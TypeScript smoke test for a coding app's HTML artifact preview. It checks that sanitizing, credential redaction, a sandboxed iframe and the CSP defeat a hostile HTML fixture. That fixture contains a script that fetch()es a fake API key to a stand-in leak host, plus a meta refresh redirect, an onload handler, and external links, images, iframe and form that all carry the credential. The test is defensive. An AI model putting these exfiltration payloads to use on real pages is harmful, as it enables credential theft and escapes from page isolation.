import type { CodingArtifactPreview } from '@/codingEnvironmentTypes'
import { hasDesktopRuntime, invokeCommand } from '@/desktop'
import { buildArtifactHTMLDocument } from '@/lib/codingArtifact'
import { redactProviderCredentials } from '@/lib/redaction'

const fixtureCredential = 'sk-artifact-webview-secret123456789'
const mutationFlag = '__milksuArtifactPreviewWebViewSmokeMutated'
const externalOrigin = 'https://artifact-preview-leak.invalid'
const resourceAttributes = [
  'action',
  'data',
  'formaction',
  'href',
  'ping',
  'poster',
  'src',
  'srcdoc',
  'srcset',
  'style',
  'xlink:href',
]
const executableSelector = [
  'base',
  'embed',
  'form',
  'iframe',
  'input',
  'link',
  'math',
  'meta[http-equiv="refresh"]',
  'object',
  'script',
  'svg',
].join(',')

export interface CodingArtifactPreviewWebViewSmokeRequest {
  enabled: boolean
  workspace?: string
  relativePath?: string
}

export interface CodingArtifactPreviewWebViewSmokeReport {
  workspace: string
  relativePath: string
  kind: string
  mediaType: string
  sandboxAttribute: string
  csp: string
  gates: Record<string, boolean>
  observations?: string[]
  summary: {
    sourceBytes: number
    sanitizedBytes: number
    redactedMarkerCount: number
    bodyText: string
  }
  error?: string
}

function byteLength(value: string): number {
  return new TextEncoder().encode(value).length
}

function shortText(value: string): string {
  return value.replace(/\s+/g, ' ').trim().slice(0, 220)
}

function countRedactedMarkers(value: string): number {
  return value.match(/\[credential redacted\]/g)?.length ?? 0
}

function findExternalResourceAttributes(document: Document): string[] {
  const values: string[] = []
  for (const element of document.querySelectorAll('*')) {
    for (const attribute of resourceAttributes) {
      const value = element.getAttribute(attribute)
      if (value?.includes('://') || value?.includes(externalOrigin)) {
        values.push(`${element.tagName.toLowerCase()}[${attribute}]`)
      }
    }
  }
  for (const style of document.querySelectorAll('style')) {
    if (style.textContent?.includes(externalOrigin)) values.push('style')
  }
  return values
}

function findEventAttributes(document: Document): string[] {
  const values: string[] = []
  for (const element of document.querySelectorAll('*')) {
    for (const attribute of Array.from(element.attributes)) {
      if (attribute.name.toLowerCase().startsWith('on')) {
        values.push(`${element.tagName.toLowerCase()}[${attribute.name}]`)
      }
    }
  }
  return values
}

function smokePayload() {
  return `
    <!doctype html>
    <html>
      <head>
        <title>Dangerous HTML WebView Smoke</title>
        <meta http-equiv="refresh" content="0;url=${externalOrigin}/redirect">
        <link rel="stylesheet" href="${externalOrigin}/style.css?api_key=${fixtureCredential}">
        <script>
          window.top.${mutationFlag} = true
          fetch('${externalOrigin}/collect?api_key=${fixtureCredential}')
        </script>
      </head>
      <body onload="window.top.${mutationFlag}=true">
        <main>
          <h1>Dangerous HTML WebView Smoke</h1>
          <p>Authorization: Bearer ${fixtureCredential}</p>
          <a href="${externalOrigin}/link?api_key=${fixtureCredential}">external link</a>
          <img src="${externalOrigin}/pixel.png?api_key=${fixtureCredential}" alt="external pixel">
          <img id="inline-ok" src="data:image/png;base64,iVBORw0KGgo=" alt="inline pixel">
          <iframe src="${externalOrigin}/frame"></iframe>
          <form action="${externalOrigin}/submit"><input name="secret" value="${fixtureCredential}"></form>
        </main>
      </body>
    </html>
  `
}

function buildFailureMessage(gates: Record<string, boolean>): string {
  const failed = Object.entries(gates)
    .filter(([, passed]) => !passed)
    .map(([name]) => name)
  return failed.length ? `failed gates: ${failed.join(', ')}` : ''
}

async function completeSmoke(report: CodingArtifactPreviewWebViewSmokeReport) {
  await invokeCommand('complete_coding_artifact_preview_webview_smoke', { report })
}

export async function runCodingArtifactPreviewWebViewSmoke(): Promise<void> {
  if (!hasDesktopRuntime()) return

  let request: CodingArtifactPreviewWebViewSmokeRequest | null = null
  try {
    request = await invokeCommand<CodingArtifactPreviewWebViewSmokeRequest>(
      'get_coding_artifact_preview_webview_smoke_request',
    )
    if (!request.enabled) return

    if (!request.workspace || !request.relativePath) {
      await completeSmoke({
        workspace: request.workspace ?? '',
        relativePath: request.relativePath ?? '',
        kind: '',
        mediaType: '',
        sandboxAttribute: '',
        csp: '',
        gates: {},
        summary: {
          sourceBytes: 0,
          sanitizedBytes: 0,
          redactedMarkerCount: 0,
          bodyText: '',
        },
        error: 'artifact preview WebView smoke requires workspace and relativePath',
      })
      return
    }

    const preview = await invokeCommand<CodingArtifactPreview>(
      'get_coding_artifact_preview',
      {
        workspacePath: request.workspace,
        relativePath: request.relativePath,
      },
    )
    const source = preview.content?.trim() ? preview.content : smokePayload()
    const redacted = redactProviderCredentials(source)
    const srcdoc = buildArtifactHTMLDocument(redacted)
    const parsed = new DOMParser().parseFromString(srcdoc, 'text/html')
    const csp = parsed
      .querySelector('meta[http-equiv="Content-Security-Policy"]')
      ?.getAttribute('content') ?? ''
    const executableElements = Array.from(parsed.querySelectorAll(executableSelector))
      .map(element => element.tagName.toLowerCase())
    const eventAttributes = findEventAttributes(parsed)
    const externalResources = findExternalResourceAttributes(parsed)

    ;(globalThis as unknown as Record<string, boolean>)[mutationFlag] = false
    const iframe = document.createElement('iframe')
    iframe.title = 'Coding HTML 产物预览 smoke'
    iframe.setAttribute('sandbox', '')
    iframe.style.position = 'fixed'
    iframe.style.width = '1px'
    iframe.style.height = '1px'
    iframe.style.opacity = '0'
    iframe.style.pointerEvents = 'none'
    iframe.style.left = '-10000px'
    iframe.srcdoc = srcdoc
    document.body.append(iframe)
    await new Promise(resolve => setTimeout(resolve, 250))
    const parentMutated = Boolean(
      (globalThis as unknown as Record<string, boolean>)[mutationFlag],
    )
    iframe.remove()
    delete (globalThis as unknown as Record<string, boolean>)[mutationFlag]

    const gates = {
      backendHTMLRead: preview.kind === 'html'
        && preview.mediaType === 'text/html'
        && source.includes('Dangerous HTML WebView Smoke'),
      iframeSandboxPresent: iframe.hasAttribute('sandbox'),
      iframeSandboxDoesNotAllowScripts: iframe.getAttribute('sandbox') === '',
      sanitizerRemovedExecutableElements: executableElements.length === 0
        && eventAttributes.length === 0,
      sanitizerRemovedExternalResources: externalResources.length === 0,
      cspBlocksNetworkAndScripts: csp.includes("default-src 'none'")
        && csp.includes("connect-src 'none'")
        && csp.includes("script-src 'none'")
        && csp.includes("frame-src 'none'"),
      credentialRedacted: source.includes(fixtureCredential)
        && !redacted.includes(fixtureCredential)
        && !srcdoc.includes(fixtureCredential)
        && srcdoc.includes('[credential redacted]'),
      parentNotMutated: !parentMutated,
    }
    const error = buildFailureMessage(gates)
    await completeSmoke({
      workspace: request.workspace,
      relativePath: preview.relativePath,
      kind: preview.kind,
      mediaType: preview.mediaType,
      sandboxAttribute: iframe.getAttribute('sandbox') ?? '',
      csp,
      gates,
      observations: [
        `removed executable elements: ${executableElements.length}`,
        `removed event attributes: ${eventAttributes.length}`,
        `removed external resources: ${externalResources.length}`,
      ],
      summary: {
        sourceBytes: byteLength(source),
        sanitizedBytes: byteLength(srcdoc),
        redactedMarkerCount: countRedactedMarkers(srcdoc),
        bodyText: shortText(
          (parsed.body.textContent ?? '').replaceAll(externalOrigin, '[external origin removed]'),
        ),
      },
      ...(error ? { error } : {}),
    })
  } catch (reason) {
    if (!request?.enabled) return
    await completeSmoke({
      workspace: request.workspace ?? '',
      relativePath: request.relativePath ?? '',
      kind: '',
      mediaType: '',
      sandboxAttribute: '',
      csp: '',
      gates: {},
      summary: {
        sourceBytes: 0,
        sanitizedBytes: 0,
        redactedMarkerCount: 0,
        bodyText: '',
      },
      error: reason instanceof Error ? reason.message : String(reason),
    })
  }
}
